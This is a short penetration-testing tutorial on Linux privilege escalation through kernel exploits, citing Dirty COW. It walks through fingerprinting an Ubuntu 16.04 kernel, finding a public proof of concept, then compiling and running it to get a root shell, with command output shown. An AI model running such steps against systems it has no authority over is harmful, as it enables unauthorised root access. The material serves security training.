# Kernel Exploits

Kernel level exploits exist for a variety of Linux kernel versions. A very well-known example is Dirty COW `*https://github.com/dirtycow/dirtycow.github.io*` (CVE-2016-5195). These leverage vulnerabilities in the kernel to execute code with root privileges. It is very common to find systems that are vulnerable to kernel exploits. It can be hard to keep track of legacy systems, and they may be excluded from patching due to compatibility issues with certain services or applications.`

Privilege escalation using a kernel exploit can be as simple as downloading, compiling, and running it. Some of these exploits work out of the box, while others require modification. A quick way to identify exploits is to issue the command uname -a and search Google for the kernel version.

# Note: Kernel exploits can cause system instability so use caution when running these against a production system.

# Kernel Exploit Example

Let's start by checking the Kernel level and Linux OS version.

> uname -a

    Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

> cat /etc/lsb-release 

    DISTRIB_ID=Ubuntu
    DISTRIB_RELEASE=16.04
    DISTRIB_CODENAME=xenial
    DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

We can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with this (https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Next download, it to the system using wget or another file transfer method. We can compile the exploit code using `gcc` (https://linux.die.net/man/1/gcc) and set the executable bit using `chmod +x`.

> gcc kernel_expoit.c -o kernel_expoit && chmod +x kernel_expoit

Next, we run the exploit and hopefully get dropped into a root shell.

> /kernel_expoit 

    task_struct = ffff8800b71d7000
    uidptr = ffff8800b95ce544
    spawning root shell

Finally, we can confirm root access to the box.

> whoami

    root